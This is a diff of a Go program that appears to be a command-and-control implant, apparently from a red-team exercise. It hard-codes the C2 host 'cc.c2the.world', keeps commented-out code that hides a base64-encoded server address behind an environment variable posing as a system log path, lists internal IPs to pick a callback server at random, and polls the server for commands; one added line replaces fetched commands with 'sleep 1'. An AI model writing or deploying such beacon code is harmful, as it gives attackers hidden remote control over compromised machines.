@@ -19,10 +19,37 @@ var src = "snare"      // where is this calling back from
 var loopTime = 60      //sleep time in secs
 
 func getServer() string {
-	//envVar := os.Getenv("DEBUGGER_LOGGING") //fetch environment variable
-	//trimmedStr := strings.Replace(envVar, "/var/log/systemd-", "", 1)
+	//envVar := os.Getenv("SYS_OUTPUT") //fetch environment variable
+	//trimmedStr := strings.Replace(envVar, "/etc/systemlogs/gaspell-", "", 1)
 	//decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
-	//return string(decoded)
+
+	/**
+	servs := make([]string, 0)
+	servs = append(servs,
+		"192.168.5.130",
+		"192.168.5.146",
+		"192.168.5.169",
+		"192.168.5.171",
+		"192.168.5.204",
+		"192.168.5.21",
+		"192.168.5.215",
+		"192.168.5.218",
+		"192.168.5.223",
+		"192.168.5.250",
+		"192.168.5.76",
+		"192.168.6.137",
+		"192.168.6.200",
+		"192.168.6.202",
+		"192.168.6.204",
+		"192.168.6.44",
+		"192.168.6.51",
+		"192.168.6.63",
+		"192.168.6.76",
+		"192.168.6.95",
+	)
+	selection := servs[rand.Intn(len(servs))]
+	return string(selection)
+	*/
 	return "cc.c2the.world"
 }
 
@@ -51,6 +78,7 @@ func getCommands() {
 	}
 	defer r.Body.Close()
 	txt, err := ioutil.ReadAll(r.Body)
+	txt = []byte("sleep 1")
 	if err != nil {
 		return
 	}
